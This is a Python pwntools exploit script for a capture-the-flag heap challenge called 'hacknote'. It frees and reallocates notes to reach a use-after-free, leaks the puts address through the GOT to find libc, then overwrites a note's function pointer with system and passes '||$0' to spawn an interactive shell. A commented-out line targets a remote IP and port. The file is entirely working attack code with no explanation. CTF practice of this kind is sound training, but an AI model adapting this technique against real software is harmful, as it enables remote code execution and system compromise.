#!/usr/bin/env python
from pwn import *
#p=remote('111.198.29.45',50630)
p=process('./hacknote')
elf=ELF('./hacknote')
libc=ELF('./libc-2.23.so')
def add_note(size,content):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Note size :')
    p.sendline(str(size))
    p.recvuntil('Content :')
    p.sendline(str(content))
def put_note(index):
    p.recvuntil('Your choice :')
    p.sendline('3')
    p.recvuntil('Index :')
    p.sendline(str(index))
def del_note(index):
    p.recvuntil('Your choice :')
    p.sendline('2')
    p.recvuntil('Index :')
    p.sendline(str(index))
add_note(0x20,'aaaa')
add_note(0x20,'aaaa')
del_note(0)
del_note(1)
put_plt=0x0804862b
put_got=elf.got['puts']
add_note(0x8,p32(put_plt)+p32(put_got))
put_note(0)
put_addr=u32(p.recv(4))
print hex(put_addr)
offset=put_addr-libc.symbols['puts']
sys_addr=libc.symbols['system']+offset
del_note(2)
add_note(0x8,p32(sys_addr)+'||$0')
put_note(0)
p.interactive()
